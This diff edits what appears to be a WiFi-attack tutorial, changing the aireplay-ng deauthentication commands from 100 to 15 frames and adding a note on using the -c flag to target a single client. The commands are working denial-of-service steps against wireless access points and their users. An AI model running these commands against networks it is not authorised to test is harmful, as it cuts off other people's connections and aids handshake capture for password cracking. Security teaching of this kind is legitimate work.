@@ -211,14 +211,12 @@ The wireless client will then hopefully re-authenticate with the AP and we’ll 
 Send your deauth request to broadcast:
 
 ```nohighlight
-sudo aireplay-ng --deauth 100 -a 4C:**:**:**:**:FA wlan0mon --ignore-negative-one
+sudo aireplay-ng --deauth 15 -a 4C:**:**:**:**:FA wlan0mon --ignore-negative-one
 ```
 
---deauth 100. The number of de-authenticate frames you want to send, in this case I used 100. (0 for unlimited)
+--deauth 15. The number of de-authenticate frames you want to send, in this case I used 15. (0 for unlimited)
 
 -a.The MAC address of the access point
-
--c. The MAC address of the client
 
 wlan0mon. The wireless interface
 
@@ -227,8 +225,9 @@ wlan0mon. The wireless interface
 Though, if you want to carry out a direct attack against one of the clients associated with the target AP we can simply issue the following command in a second terminal while leaving our initial command running in the 1st terminal, then running the command below in a 2nd terminal:
 
 ```nohighlight
-sudo aireplay-ng --deauth 100 -a 4C:**:**:**:**:FA -c 60:**:**:**:**:E3 wlan0mon --ignore-negative-one
+sudo aireplay-ng --deauth 15 -a 4C:**:**:**:**:FA -c 60:**:**:**:**:E3 wlan0mon --ignore-negative-one
 ```
+*Note: The addition of the '-c' flag. This allows you to specify the MAC address of an identified client*
 
 ![DeAuth Attack](/images/WiFi/deauth-attack.png)
 
